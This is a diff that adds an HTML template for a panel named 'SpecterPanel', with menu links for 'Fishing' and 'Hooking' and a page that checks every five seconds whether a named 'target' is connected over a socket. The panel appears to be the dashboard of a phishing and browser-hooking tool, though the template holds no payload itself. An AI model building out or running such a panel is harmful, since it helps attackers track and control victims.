@@ -1,0 +1,113 @@
+{% extends 'view.html' %}
+
+{% block menus %}
+<nav class="sidebar sidebar-offcanvas" id="sidebar">
+	<div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
+	  <a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
+	  <a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
+	</div>
+	<ul class="nav">
+	  <li class="nav-item nav-category">
+		<span class="nav-link">Menu Options</span>
+	  </li>
+	  <li class="nav-item menu-items">
+		<a class="nav-link" href="/dashboard">
+		  <span class="menu-icon">
+			<i class="mdi mdi-view-dashboard"></i>
+		  </span>
+		  <span class="menu-title">Dashboard</span>
+		</a>
+	  </li>
+	  <li class="nav-item menu-items">
+		<a class="nav-link" href="/api_link">
+		  <span class="menu-icon">
+			<i class="mdi mdi-webhook"></i>
+		  </span>
+		  <span class="menu-title">Api Link</span>
+		</a>
+	  </li>
+	  <li class="nav-item menu-items">
+		<a class="nav-link" href="/fishing">
+		  <span class="menu-icon">
+			<i class="mdi mdi-fish"></i>
+		  </span>
+		  <span class="menu-title">Fishing</span>
+		</a>
+	  </li>
+	  <li class="nav-item menu-items">
+		<a class="nav-link" href="/hooking">
+		  <span class="menu-icon">
+			<i class="mdi mdi-hook"></i>
+		  </span>
+		  <span class="menu-title">Hooking</span>
+		</a>
+	  </li>
+	  <li class="nav-item menu-items">
+		<a class="nav-link" href="/code">
+		  <span class="menu-icon">
+			<i class="mdi mdi-code-braces"></i>
+		  </span>
+		  <span class="menu-title">Code ground</span>
+		</a>
+	  </li>
+	</ul>
+</nav>
+{% endblock %}
+
+
+{% block title %}Socket Status{% endblock %}
+
+{% block body %}
+<div class="content-wrapper">
+  <div class="row">
+    <div class="col-md-8 grid-margin stretch-card mx-auto">
+      <div class="card">
+        <div class="card-body text-center">
+          <h3 class="mb-4">Socket Status Monitor</h3>
+          <p class="mb-3">Target: <strong id="targetName">{{ target_name }}</strong></p>
+          <div id="statusBox" class="badge badge-secondary py-2 px-4">Loading...</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block script %}
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const targetName = "{{ target_name }}";
+    const token = "{{ token }}";
+    const statusBox = document.getElementById("statusBox");
+
+    async function fetchStatus() {
+      try {
+        const response = await fetch(`/api/socket/${targetName}?token=${token}`);
+        if (response.ok) {
+          const data = await response.json();
+          statusBox.textContent = data.status;
+
+          statusBox.className = "badge py-2 px-4";
+          if (data.status === "connected") {
+            statusBox.classList.add("badge-success");
+          } else if (data.status === "disconnected") {
+            statusBox.classList.add("badge-danger");
+          } else {
+            statusBox.classList.add("badge-warning");
+          }
+        } else {
+          statusBox.textContent = "Error fetching status";
+          statusBox.className = "badge badge-danger py-2 px-4";
+        }
+      } catch (err) {
+        statusBox.textContent = "Network error";
+        statusBox.className = "badge badge-danger py-2 px-4";
+      }
+    }
+
+    fetchStatus();
+    setInterval(fetchStatus, 5000); // auto-refresh every 5 seconds
+  });
+</script>
+{% endblock %}
+
